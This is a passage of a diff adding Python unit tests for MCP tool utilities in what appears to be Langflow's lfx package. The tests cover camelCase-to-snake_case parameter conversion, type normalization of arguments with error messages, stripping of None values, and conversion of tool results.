+        assert result == {"weather_main": "Rain", "top_n": 10, "user_id": "user456"}
+
+    def test_convert_parameters_mixed_fields(self, mcp_tool):
+        """Test _convert_parameters with mixed exact and camelCase fields."""
+        input_dict = {
+            "weather_main": "Cloudy",  # Exact match
+            "topN": 3,  # CamelCase -> snake_case
+            "userId": "user789",  # CamelCase -> snake_case
+        }
+
+        result = mcp_tool._convert_parameters(input_dict)
+
+        assert result == {"weather_main": "Cloudy", "top_n": 3, "user_id": "user789"}
+
+    def test_convert_parameters_unknown_fields(self, mcp_tool):
+        """Test _convert_parameters with fields not in schema."""
+        input_dict = {"weatherMain": "Sunny", "unknownField": "value", "anotherUnknown": 42}
+
+        result = mcp_tool._convert_parameters(input_dict)
+
+        # Known fields should be converted, unknown fields kept as-is
+        assert result == {"weather_main": "Sunny", "unknownField": "value", "anotherUnknown": 42}
+
+    def test_convert_parameters_empty_input(self, mcp_tool):
+        """Test _convert_parameters with empty/None input."""
+        assert mcp_tool._convert_parameters({}) == {}
+        assert mcp_tool._convert_parameters(None) is None
+        assert mcp_tool._convert_parameters("not_a_dict") == "not_a_dict"
+
+    def test_convert_parameters_flattened_input_produces_nested(self):
+        """Test flattened keys (params.search, params.per_page) become nested structure."""
+        from lfx.base.agents.utils import maybe_unflatten_dict
+        from lfx.base.mcp.util import _camel_to_snake
+        from pydantic import Field, create_model
+
+        schema = create_model(
+            "ForemanSchema",
+            resource=(str, Field(..., description="Resource")),
+            action=(str, Field(..., description="Action")),
+            params=(dict, Field(default_factory=dict, description="Params")),
+        )
+
+        def _convert_parameters(input_dict, args_schema):
+            if not input_dict or not isinstance(input_dict, dict):
+                return input_dict
+            converted_dict = {}
+            original_fields = set(args_schema.model_fields.keys())
+            for key, value in input_dict.items():
+                if key in original_fields:
+                    converted_dict[key] = value
+                else:
+                    snake_key = _camel_to_snake(key)
+                    if snake_key in original_fields:
+                        converted_dict[snake_key] = value
+                    else:
+                        converted_dict[key] = value
+            return maybe_unflatten_dict(converted_dict)
+
+        input_dict = {
+            "resource": "hosts",
+            "action": "index",
+            "params.search": "name ~ test",
+            "params.per_page": 20,
+        }
+        result = _convert_parameters(input_dict, schema)
+        assert result == {
+            "resource": "hosts",
+            "action": "index",
+            "params": {"search": "name ~ test", "per_page": 20},
+        }
+
+    def test_convert_parameters_preserves_value_types(self, mcp_tool):
+        """Test _convert_parameters preserves all value types correctly."""
+        input_dict = {
+            "weatherMain": "Snow",
+            "topN": 42,
+            "complexData": {"nested": "value", "list": [1, 2, 3], "boolean": True},
+        }
+
+        result = mcp_tool._convert_parameters(input_dict)
+
+        expected = {
+            "weather_main": "Snow",
+            "top_n": 42,
+            "complexData": {"nested": "value", "list": [1, 2, 3], "boolean": True},
+        }
+        assert result == expected
+
+    def test_run_with_dict_input(self, mcp_tool, mock_client):
+        """Test run method with dictionary input."""
+        # Test with all required fields
+        input_data = {"weatherMain": "Snow", "topN": 5}
+
+        mcp_tool.run(input_data)
+
+        # Verify the mock client was called with converted parameters
+        mock_client.run_tool.assert_called_once()
+        call_args = mock_client.run_tool.call_args[1]["arguments"]
+        assert call_args["weather_main"] == "Snow"
+        assert call_args["top_n"] == 5
+
+    def test_run_with_string_input_json(self, mcp_tool, mock_client):
+        """Test run method with valid JSON string input."""
+        import json
+
+        input_data = json.dumps({"weatherMain": "Rain", "topN": 3})
+
+        mcp_tool.run(input_data)
+
+        # Verify the mock client was called with converted parameters
+        mock_client.run_tool.assert_called_once()
+        call_args = mock_client.run_tool.call_args[1]["arguments"]
+        assert call_args["weather_main"] == "Rain"
+        assert call_args["top_n"] == 3
+
+    def test_run_with_string_input_non_json(self, mcp_tool):
+        """Test run method with non-JSON string input."""
+        # This will cause a validation error since we have required fields
+        # Let's test that the error handling works
+        with pytest.raises(Exception):  # noqa: B017, PT011
+            mcp_tool.run("simple string input")
+
+    def test_run_with_none_input(self, mcp_tool):
+        """Test run method with None input."""
+        # This will cause a validation error since we have required fields
+        with pytest.raises(Exception):  # noqa: B017, PT011
+            mcp_tool.run(None)
+
+    @pytest.mark.asyncio
+    async def test_arun_with_dict_input(self, mcp_tool, mock_client):
+        """Test arun method with dictionary input."""
+        input_data = {"weatherMain": "Snow", "topN": 8}
+
+        await mcp_tool.arun(input_data)
+
+        # Verify the mock client was called with converted parameters
+        mock_client.run_tool.assert_called_once()
+        call_args = mock_client.run_tool.call_args[1]["arguments"]
+        assert call_args["weather_main"] == "Snow"
+        assert call_args["top_n"] == 8
+
+    @pytest.mark.asyncio
+    async def test_arun_with_string_input_json(self, mcp_tool, mock_client):
+        """Test arun method with valid JSON string input."""
+        import json
+
+        input_data = json.dumps({"weatherMain": "Storm", "topN": 1})
+
+        await mcp_tool.arun(input_data)
+
+        # Verify the mock client was called with converted parameters
+        mock_client.run_tool.assert_called_once()
+        call_args = mock_client.run_tool.call_args[1]["arguments"]
+        assert call_args["weather_main"] == "Storm"
+        assert call_args["top_n"] == 1
+
+    @pytest.mark.asyncio
+    async def test_arun_with_string_input_non_json(self, mcp_tool):
+        """Test arun method with non-JSON string input."""
+        # This will cause a validation error since we have required fields
+        with pytest.raises(Exception):  # noqa: B017, PT011
+            await mcp_tool.arun("async string input")
+
+    @pytest.mark.asyncio
+    async def test_arun_with_none_input(self, mcp_tool):
+        """Test arun method with None input."""
+        # This will cause a validation error since we have required fields
+        with pytest.raises(Exception):  # noqa: B017, PT011
+            await mcp_tool.arun(None)
+
+    def test_run_passes_config_and_kwargs(self, mcp_tool, mock_client):
+        """Test that run method properly passes config and kwargs to parent."""
+        from unittest.mock import patch
+
+        input_data = {"weatherMain": "Clear", "topN": 1}
+        config = {"some": "config"}
+        extra_kwargs = {"extra": "param"}
+
+        # Mock run_until_complete from async_helpers
+        with patch("lfx.base.mcp.util.run_until_complete", return_value="tool_result"):
+            # Just verify that the method completes successfully with config/kwargs
+            mcp_tool.run(input_data, config=config, **extra_kwargs)
+
+            # Verify the tool was executed
+            mock_client.run_tool.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_arun_passes_config_and_kwargs(self, mcp_tool, mock_client):
+        """Test that arun method properly passes config and kwargs to parent."""
+        input_data = {"weatherMain": "Hail", "topN": 2}
+        config = {"async": "config"}
+        extra_kwargs = {"async_extra": "param"}
+
+        # Just verify that the method completes successfully with config/kwargs
+        await mcp_tool.arun(input_data, config=config, **extra_kwargs)
+
+        # Verify the tool was executed
+        mock_client.run_tool.assert_called_once()
+
+    def test_run_integration_with_validation_error(self, mcp_tool):
+        """Test run method handles validation errors properly."""
+        # Input missing required field to trigger validation error
+        input_data = {"weatherMain": "Snow"}  # Missing topN
+
+        with pytest.raises(Exception):  # noqa: B017, PT011
+            mcp_tool.run(input_data)
+
+    @pytest.mark.asyncio
+    async def test_arun_integration_with_validation_error(self, mcp_tool):
+        """Test arun method handles validation errors properly."""
+        # Input missing required field to trigger validation error
+        input_data = {"weatherMain": "Rain"}  # Missing topN
+
+        with pytest.raises(Exception):  # noqa: B017, PT011
+            await mcp_tool.arun(input_data)
+
+
+class TestNormalizeArgumentsForMcp:
+    """Test _normalize_arguments_for_mcp try-convert on type mismatch."""
+
+    def test_str_to_int_when_int_expected(self):
+        """Test str '42' when int expected -> 42."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            count: int = Field(..., description="Count")
+
+        result = util._normalize_arguments_for_mcp({"count": "42"}, Schema, "test_tool")
+        assert result == {"count": 42}
+        assert isinstance(result["count"], int)
+
+    def test_float_to_int_when_int_expected(self):
+        """Test float 3.0 when int expected -> 3."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            id: int = Field(..., description="ID")
+
+        result = util._normalize_arguments_for_mcp({"id": 3.0}, Schema, "test_tool")
+        assert result == {"id": 3}
+        assert isinstance(result["id"], int)
+
+    def test_str_to_dict_when_dict_expected(self):
+        r"""Test str '{"x":1}' when dict expected -> {"x":1}."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            params: dict = Field(..., description="Params")
+
+        result = util._normalize_arguments_for_mcp({"params": '{"x": 1}'}, Schema, "test_tool")
+        assert result == {"params": {"x": 1}}
+        assert isinstance(result["params"], dict)
+
+    def test_langflow_data_to_dict_when_dict_expected(self):
+        """Test Langflow Data/JSON connected to a dict MCP parameter unwraps to its payload."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            params: dict = Field(..., description="Params")
+
+        value = Data(data={"item1": "value_a"})
+
+        result = util._normalize_arguments_for_mcp({"params": value}, Schema, "test_tool")
+        assert result == {"params": {"item1": "value_a"}}
+
+    def test_str_to_bool_when_bool_expected(self):
+        """Test str 'true' when bool expected -> True."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            flag: bool = Field(..., description="Flag")
+
+        result = util._normalize_arguments_for_mcp({"flag": "true"}, Schema, "test_tool")
+        assert result == {"flag": True}
+
+    def test_already_correct_types_unchanged(self):
+        """Test value type matches schema -> unchanged."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            count: int = Field(..., description="Count")
+            params: dict = Field(..., description="Params")
+
+        result = util._normalize_arguments_for_mcp({"count": 42, "params": {"search": "x"}}, Schema, "test_tool")
+        assert result == {"count": 42, "params": {"search": "x"}}
+
+    def test_conversion_failure_propagates_error(self):
+        """Test str 'abc' when int expected -> clear error propagated."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            id: int = Field(..., description="ID")
+
+        with pytest.raises(ValueError, match="expects integer") as exc_info:
+            util._normalize_arguments_for_mcp({"id": "abc"}, Schema, "test_tool")
+
+        assert "test_tool" in str(exc_info.value)
+        assert "Parameter 'id'" in str(exc_info.value)
+        assert "could not convert" in str(exc_info.value)
+
+    def test_optional_field_none_unchanged(self):
+        """Test optional field with None -> unchanged."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            count: int = Field(..., description="Count")
+            optional: int | None = Field(default=None, description="Optional")
+
+        result = util._normalize_arguments_for_mcp({"count": 1, "optional": None}, Schema, "test_tool")
+        assert result == {"count": 1, "optional": None}
+
+    def test_required_list_none_maps_to_empty(self):
+        """Test required list field with None -> maps to []."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            items: list = Field(..., description="Items")
+
+        result = util._normalize_arguments_for_mcp({"items": None}, Schema, "test_tool")
+        assert result == {"items": []}
+        assert isinstance(result["items"], list)
+
+    def test_required_dict_none_maps_to_empty(self):
+        """Test required dict field with None -> maps to {}."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            params: dict = Field(..., description="Params")
+
+        result = util._normalize_arguments_for_mcp({"params": None}, Schema, "test_tool")
+        assert result == {"params": {}}
+        assert isinstance(result["params"], dict)
+
+    def test_required_str_none_maps_to_empty(self):
+        """Test required str field with None -> maps to ""."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            name: str = Field(..., description="Name")
+
+        result = util._normalize_arguments_for_mcp({"name": None}, Schema, "test_tool")
+        assert result == {"name": ""}
+        assert result["name"] == ""
+
+    def test_optional_list_none_unchanged(self):
+        """Test optional list field with None -> unchanged."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            items: list[str] | None = Field(default=None, description="Items")
+
+        result = util._normalize_arguments_for_mcp({"items": None}, Schema, "test_tool")
+        assert result == {"items": None}
+
+    def test_optional_dict_none_unchanged(self):
+        """Test optional dict field with None -> unchanged."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            params: dict | None = Field(default=None, description="Params")
+
+        result = util._normalize_arguments_for_mcp({"params": None}, Schema, "test_tool")
+        assert result == {"params": None}
+
+    def test_optional_str_none_unchanged(self):
+        """Test optional str field with None -> unchanged."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            name: str | None = Field(default=None, description="Name")
+
+        result = util._normalize_arguments_for_mcp({"name": None}, Schema, "test_tool")
+        assert result == {"name": None}
+
+    def test_str_to_list_when_optional_list_expected(self):
+        r"""Test str '["a"]' when list[str] | None expected -> ["a"]."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            items: list[str] | None = Field(default=None, description="Items")
+
+        result = util._normalize_arguments_for_mcp({"items": '["a", "b"]'}, Schema, "test_tool")
+        assert result == {"items": ["a", "b"]}
+        assert isinstance(result["items"], list)
+
+    def test_str_to_dict_when_optional_dict_expected(self):
+        r"""Test str '{"x":1}' when dict | None expected -> {"x":1}."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            params: dict | None = Field(default=None, description="Params")
+
+        result = util._normalize_arguments_for_mcp({"params": '{"x": 1}'}, Schema, "test_tool")
+        assert result == {"params": {"x": 1}}
+        assert isinstance(result["params"], dict)
+
+    def test_bool_rejected_when_int_expected(self):
+        """Test bool True/False when int expected -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            count: int = Field(..., description="Count")
+
+        with pytest.raises(ValueError, match=r"expects integer.*bool"):
+            util._normalize_arguments_for_mcp({"count": True}, Schema, "test_tool")
+
+        with pytest.raises(ValueError, match=r"expects integer.*bool"):
+            util._normalize_arguments_for_mcp({"count": False}, Schema, "test_tool")
+
+    def test_extra_keys_preserved_for_pydantic_validation(self):
+        """Test extra keys not in schema are preserved so Pydantic can report them."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            valid_field: int = Field(..., description="Valid")
+
+        result = util._normalize_arguments_for_mcp({"valid_field": 1, "typo_field": 2}, Schema, "test_tool")
+        assert result["valid_field"] == 1
+        assert result["typo_field"] == 2
+
+    def test_str_to_float_when_float_expected(self):
+        """Test str '3.14' when float expected -> 3.14."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            value: float = Field(..., description="Value")
+
+        result = util._normalize_arguments_for_mcp({"value": "3.14"}, Schema, "test_tool")
+        assert result == {"value": 3.14}
+        assert isinstance(result["value"], float)
+
+    def test_invalid_json_for_dict_raises_clear_error(self):
+        """Test invalid JSON string when dict expected raises ValueError with tool and param name."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            params: dict = Field(..., description="Params")
+
+        with pytest.raises(ValueError, match=r"expects object \(dict\)") as exc_info:
+            util._normalize_arguments_for_mcp({"params": "not valid json"}, Schema, "my_tool")
+
+        assert "my_tool" in str(exc_info.value)
+        assert "Parameter 'params'" in str(exc_info.value)
+        assert "invalid JSON" in str(exc_info.value)
+
+    def test_invalid_json_for_list_raises_clear_error(self):
+        """Test invalid JSON string when list expected raises ValueError with tool and param name."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            items: list = Field(..., description="Items")
+
+        with pytest.raises(ValueError, match=r"expects array \(list\)") as exc_info:
+            util._normalize_arguments_for_mcp({"items": "{invalid"}, Schema, "list_tool")
+
+        assert "list_tool" in str(exc_info.value)
+        assert "Parameter 'items'" in str(exc_info.value)
+        assert "invalid JSON" in str(exc_info.value)
+
+    def test_str_to_dict_when_nested_model_expected(self):
+        """Test str JSON when nested Pydantic model expected -> parsed dict (foreman-mcp params case)."""
+        from pydantic import BaseModel, Field
+
+        class ParamsModel(BaseModel):
+            search: str | None = None
+            per_page: int | None = None
+            page: int | None = None
+
+        class Schema(BaseModel):
+            params: ParamsModel = Field(..., description="Params")
+
+        json_str = '{"search":"installed_packages","per_page":50}'
+        result = util._normalize_arguments_for_mcp({"params": json_str}, Schema, "test_tool")
+        assert result["params"] == {"search": "installed_packages", "per_page": 50}
+        assert isinstance(result["params"], dict)
+
+    def test_nested_model_already_dict_unchanged(self):
+        """Test nested model field with dict value -> unchanged."""
+        from pydantic import BaseModel, Field
+
+        class ParamsModel(BaseModel):
+            search: str | None = None
+
+        class Schema(BaseModel):
+            params: ParamsModel = Field(..., description="Params")
+
+        result = util._normalize_arguments_for_mcp({"params": {"search": "test"}}, Schema, "test_tool")
+        assert result == {"params": {"search": "test"}}
+
+    def test_str_to_bool_false_variants(self):
+        """Test str 'false'/'0'/'no' when bool expected -> False."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            flag: bool = Field(..., description="Flag")
+
+        for val in ("false", "0", "no"):
+            result = util._normalize_arguments_for_mcp({"flag": val}, Schema, "test_tool")
+            assert result == {"flag": False}
+            assert result["flag"] is False
+
+    def test_dict_expected_json_parses_to_list_raises(self):
+        """Test dict expected but JSON string parses to list -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            params: dict = Field(..., description="Params")
+
+        with pytest.raises(ValueError, match=r"expects object \(dict\)") as exc_info:
+            util._normalize_arguments_for_mcp({"params": '["a", "b"]'}, Schema, "my_tool")
+
+        assert "my_tool" in str(exc_info.value)
+        assert "Parameter 'params'" in str(exc_info.value)
+        assert "JSON parsed to list" in str(exc_info.value)
+
+    def test_list_expected_json_parses_to_dict_raises(self):
+        """Test list expected but JSON string parses to dict -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            items: list = Field(..., description="Items")
+
+        with pytest.raises(ValueError, match=r"expects array \(list\)") as exc_info:
+            util._normalize_arguments_for_mcp({"items": '{"x": 1}'}, Schema, "list_tool")
+
+        assert "list_tool" in str(exc_info.value)
+        assert "Parameter 'items'" in str(exc_info.value)
+        assert "JSON parsed to dict" in str(exc_info.value)
+
+    def test_int_expected_non_integer_float_raises(self):
+        """Test int expected but float 3.14 (non-integer) -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            count: int = Field(..., description="Count")
+
+        with pytest.raises(ValueError, match=r"expects integer") as exc_info:
+            util._normalize_arguments_for_mcp({"count": 3.14}, Schema, "test_tool")
+
+        assert "test_tool" in str(exc_info.value)
+        assert "Parameter 'count'" in str(exc_info.value)
+        assert "could not convert" in str(exc_info.value)
+
+    def test_int_expected_list_or_dict_raises(self):
+        """Test int expected but list/dict value -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            count: int = Field(..., description="Count")
+
+        for val in ([], {}):
+            with pytest.raises(ValueError, match=r"expects integer"):
+                util._normalize_arguments_for_mcp({"count": val}, Schema, "test_tool")
+
+    def test_float_expected_invalid_str_raises(self):
+        """Test float expected but str 'abc' -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            value: float = Field(..., description="Value")
+
+        with pytest.raises(ValueError, match=r"expects number") as exc_info:
+            util._normalize_arguments_for_mcp({"value": "abc"}, Schema, "test_tool")
+
+        assert "test_tool" in str(exc_info.value)
+        assert "Parameter 'value'" in str(exc_info.value)
+        assert "could not convert" in str(exc_info.value)
+
+    def test_float_expected_list_or_dict_raises(self):
+        """Test float expected but list/dict value -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            value: float = Field(..., description="Value")
+
+        for val in ([], {}):
+            with pytest.raises(ValueError, match=r"expects number"):
+                util._normalize_arguments_for_mcp({"value": val}, Schema, "test_tool")
+
+    def test_bool_expected_invalid_str_raises(self):
+        """Test bool expected but str 'maybe' -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            flag: bool = Field(..., description="Flag")
+
+        with pytest.raises(ValueError, match=r"expects.*bool") as exc_info:
+            util._normalize_arguments_for_mcp({"flag": "maybe"}, Schema, "test_tool")
+
+        assert "test_tool" in str(exc_info.value)
+        assert "Parameter 'flag'" in str(exc_info.value)
+        assert "could not convert" in str(exc_info.value)
+
+    def test_bool_expected_int_raises(self):
+        """Test bool expected but int 1 -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            flag: bool = Field(..., description="Flag")
+
+        with pytest.raises(ValueError, match=r"expects.*bool") as exc_info:
+            util._normalize_arguments_for_mcp({"flag": 1}, Schema, "test_tool")
+
+        assert "test_tool" in str(exc_info.value)
+        assert "Parameter 'flag'" in str(exc_info.value)
+        assert "could not convert" in str(exc_info.value)
+
+    def test_dict_expected_non_str_value_raises(self):
+        """Test dict expected but list value (not str) -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            params: dict = Field(..., description="Params")
+
+        with pytest.raises(ValueError, match=r"expects object \(dict\)") as exc_info:
+            util._normalize_arguments_for_mcp({"params": ["a", "b"]}, Schema, "my_tool")
+
+        assert "my_tool" in str(exc_info.value)
+        assert "Parameter 'params'" in str(exc_info.value)
+        assert "could not convert" in str(exc_info.value)
+
+    def test_list_expected_non_str_value_raises(self):
+        """Test list expected but dict value (not str) -> raises ValueError."""
+        from pydantic import BaseModel, Field
+
+        class Schema(BaseModel):
+            items: list = Field(..., description="Items")
+
+        with pytest.raises(ValueError, match=r"expects array \(list\)") as exc_info:
+            util._normalize_arguments_for_mcp({"items": {"x": 1}}, Schema, "list_tool")
+
+        assert "list_tool" in str(exc_info.value)
+        assert "Parameter 'items'" in str(exc_info.value)
+        assert "could not convert" in str(exc_info.value)
+
+    def test_try_convert_value_none_raises(self):
+        """Test _try_convert_value with None when scalar type expected -> raises ValueError (direct caller)."""
+        with pytest.raises(ValueError, match=r"expects.*but received None") as exc_info:
+            util._try_convert_value(None, int, "count", "test_tool")
+
+        assert "test_tool" in str(exc_info.value)
+        assert "Parameter 'count'" in str(exc_info.value)
+
+
+class TestSnakeToCamelConversion:
+    """Test the _snake_to_camel function from json_schema module."""
+
+    def test_snake_to_camel_basic(self):
+        """Test basic snake_case to camelCase conversion."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        assert _snake_to_camel("weather_main") == "weatherMain"
+        assert _snake_to_camel("top_n") == "topN"
+        assert _snake_to_camel("first_name") == "firstName"
+        assert _snake_to_camel("last_name") == "lastName"
+        assert _snake_to_camel("user_id") == "userId"
+
+    def test_snake_to_camel_single_word(self):
+        """Test single word conversion (should remain unchanged)."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        assert _snake_to_camel("simple") == "simple"
+        assert _snake_to_camel("name") == "name"
+        assert _snake_to_camel("id") == "id"
+
+    def test_snake_to_camel_empty_string(self):
+        """Test empty string handling."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        assert _snake_to_camel("") == ""
+
+    def test_snake_to_camel_leading_underscores(self):
+        """Test that leading underscores are preserved."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        # Single leading underscore (private convention)
+        assert _snake_to_camel("_my_variable") == "_myVariable"
+        assert _snake_to_camel("_user_id") == "_userId"
+        assert _snake_to_camel("_internal_name") == "_internalName"
+
+        # Double leading underscore (strongly private convention)
+        assert _snake_to_camel("__private_var") == "__privateVar"
+        assert _snake_to_camel("__init_method") == "__initMethod"
+
+        # Dunder methods (magic methods)
+        assert _snake_to_camel("__special_method__") == "__specialMethod__"
+
+    def test_snake_to_camel_trailing_underscores(self):
+        """Test that trailing underscores are preserved."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        # Single trailing underscore (keyword conflict avoidance)
+        assert _snake_to_camel("class_") == "class_"
+        assert _snake_to_camel("type_") == "type_"
+        assert _snake_to_camel("from_address_") == "fromAddress_"
+
+        # Multiple trailing underscores
+        assert _snake_to_camel("reserved_word__") == "reservedWord__"
+
+    def test_snake_to_camel_both_leading_and_trailing(self):
+        """Test preservation of both leading and trailing underscores."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        assert _snake_to_camel("_my_class_") == "_myClass_"
+        assert _snake_to_camel("__private_type__") == "__privateType__"
+        assert _snake_to_camel("_internal_method_") == "_internalMethod_"
+
+    def test_snake_to_camel_only_underscores(self):
+        """Test strings that are only underscores."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        assert _snake_to_camel("_") == "_"
+        assert _snake_to_camel("__") == "__"
+        assert _snake_to_camel("___") == "___"
+
+    def test_snake_to_camel_multiple_consecutive_underscores(self):
+        """Test handling of multiple consecutive underscores in the middle."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        # Multiple underscores should be treated as separators
+        # Note: This tests current behavior - we may want to normalize this
+        assert _snake_to_camel("my__double__underscore") == "myDoubleUnderscore"
+        assert _snake_to_camel("triple___underscore") == "tripleUnderscore"
+
+    def test_snake_to_camel_edge_cases(self):
+        """Test various edge cases."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        # Single character components
+        assert _snake_to_camel("a_b_c") == "aBC"
+
+        # Numbers in names
+        assert _snake_to_camel("version_2_beta") == "version2Beta"
+        assert _snake_to_camel("test_123_value") == "test123Value"
+
+        # Already camelCase (no underscores)
+        assert _snake_to_camel("alreadyCamelCase") == "alreadyCamelCase"
+
+    def test_snake_to_camel_with_api_field_names(self):
+        """Test conversion of common API field names that should preserve underscores."""
+        from lfx.schema.json_schema import _snake_to_camel
+
+        # MongoDB-style IDs
+        assert _snake_to_camel("_id") == "_id"
+
+        # Type discriminators
+        assert _snake_to_camel("_type") == "_type"
+
+        # Metadata fields
+        assert _snake_to_camel("_meta_data") == "_metaData"
+        assert _snake_to_camel("_created_at") == "_createdAt"
+
+
+class TestStripNoneRecursive:
+    """Tests for _strip_none_recursive.
+
+    Ensures null values are removed from nested dicts and arrays before
+    sending arguments to MCP servers.
+
+    Bug: antvis/mcp-server-chart returns "Expected string, received null"
+    because LLMs send explicit null for optional fields inside arrays of objects.
+    """
+
+    def test_should_remove_none_from_flat_dict(self):
+        """Top-level None values must be stripped."""
+        from lfx.base.mcp.util import _strip_none_recursive
+
+        # Arrange
+        data = {"name": "chart", "style": None, "title": "My Chart"}
+
+        # Act
+        result = _strip_none_recursive(data)
+
+        # Assert
+        assert result == {"name": "chart", "title": "My Chart"}
+        assert "style" not in result
+
+    def test_should_remove_none_from_nested_objects_in_arrays(self):
+        """The exact bug scenario: data[N].group = null inside an array."""
+        from lfx.base.mcp.util import _strip_none_recursive
+
+        # Arrange — reproduces the exact payload from the bug report
+        data = {
+            "data": [
+                {"name": "Revenue", "value": 100, "group": None},
+                {"name": "Costs", "value": 50, "group": None},
+                {"name": "Profit", "value": 50, "group": None},
+            ],
+            "style": None,
+        }
+
+        # Act
+        result = _strip_none_recursive(data)
+
+        # Assert — group and style must be absent
+        assert result == {
+            "data": [
+                {"name": "Revenue", "value": 100},
+                {"name": "Costs", "value": 50},
+                {"name": "Profit", "value": 50},
+            ],
+        }
+        assert "style" not in result
+        for item in result["data"]:
+            assert "group" not in item
+
+    def test_should_handle_deeply_nested_none(self):
+        """None values several levels deep must also be stripped."""
+        from lfx.base.mcp.util import _strip_none_recursive
+
+        # Arrange
+        data = {
+            "config": {
+                "axis": {"label": None, "color": "red"},
+                "legend": None,
+            }
+        }
+
+        # Act
+        result = _strip_none_recursive(data)
+
+        # Assert
+        assert result == {"config": {"axis": {"color": "red"}}}
+
+    def test_should_preserve_falsy_non_none_values(self):
+        """Zero, empty string, False, empty list, empty dict must NOT be stripped."""
+        from lfx.base.mcp.util import _strip_none_recursive
+
+        # Arrange
+        data = {
+            "count": 0,
+            "label": "",
+            "enabled": False,
+            "items": [],
+            "meta": {},
+        }
+
+        # Act
+        result = _strip_none_recursive(data)
+
+        # Assert — all falsy-but-not-None values preserved
+        assert result == {
+            "count": 0,
+            "label": "",
+            "enabled": False,
+            "items": [],
+            "meta": {},
+        }
+
+    def test_should_return_primitives_unchanged(self):
+        """Non-dict, non-list values pass through unchanged."""
+        from lfx.base.mcp.util import _strip_none_recursive
+
+        assert _strip_none_recursive("hello") == "hello"
+        assert _strip_none_recursive(42) == 42
+        assert _strip_none_recursive(True) is True  # noqa: FBT003
+
+    def test_should_handle_empty_structures(self):
+        """Empty dict and empty list return empty."""
+        from lfx.base.mcp.util import _strip_none_recursive
+
+        assert _strip_none_recursive({}) == {}
+        assert _strip_none_recursive([]) == []
+
+    def test_should_handle_list_of_primitives_with_none(self):
+        """None items inside a plain list are NOT removed (only dict keys)."""
+        from lfx.base.mcp.util import _strip_none_recursive
+
+        # Arrange — list items that are None stay (we only strip dict keys)
+        data = [1, None, "hello", None]
+
+        # Act
+        result = _strip_none_recursive(data)
+
+        # Assert — None items in list preserved (stripping applies to dict keys only)
+        assert result == [1, None, "hello", None]
+
+
+class TestConvertMcpResult:
+    """Tests for _convert_mcp_result.
+
+    Ensures MCP CallToolResult objects are properly converted into formats
+    that LangChain agents can consume, including multimodal image support.
+
+    Bug: MCP tools returning image content were passing the raw
+    CallToolResult Python object as a string to the LLM instead of
+    converting it to the image_url format required for vision models.
+    Fixes issue #11812.
+    """
+
+    def _make_text_block(self, text: str):
+        block = MagicMock()
+        block.type = "text"
+        block.text = text
+        return block
+
+    def _make_image_block(self, data: str = "abc123", mime: str = "image/png"):
+        block = MagicMock()
+        block.type = "image"
+        block.data = data
+        block.mimeType = mime
+        return block
+
+    def _make_result(self, content):
+        result = MagicMock()
+        result.content = content
+        return result
+
+    def test_should_return_empty_string_for_none_result(self):
+        """None result must return empty string without raising."""
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        assert _convert_mcp_result(None) == ""
+
+    def test_should_return_empty_string_for_empty_content(self):
+        """Result with empty content list must return empty string."""
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        result = self._make_result([])
+        assert _convert_mcp_result(result) == ""
+
+    def test_should_return_empty_string_for_missing_content_attr(self):
+        """Result without a content attribute must return empty string."""
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        result = MagicMock(spec=[])  # no attributes
+        assert _convert_mcp_result(result) == ""
+
+    def test_should_return_plain_string_for_single_text_block(self):
+        """Single text block must return a plain string (backward compatible)."""
+        from lfx.base.mcp.util import _convert_mcp_result
+
+        result = self._make_result([self._make_text_block("hello world")])
+        assert _convert_mcp_result(result) == "hello world"
+
+    def test_should_join_multiple_text_blocks_with_newline(self):
+        """Multiple text blocks must be joined with newline."""
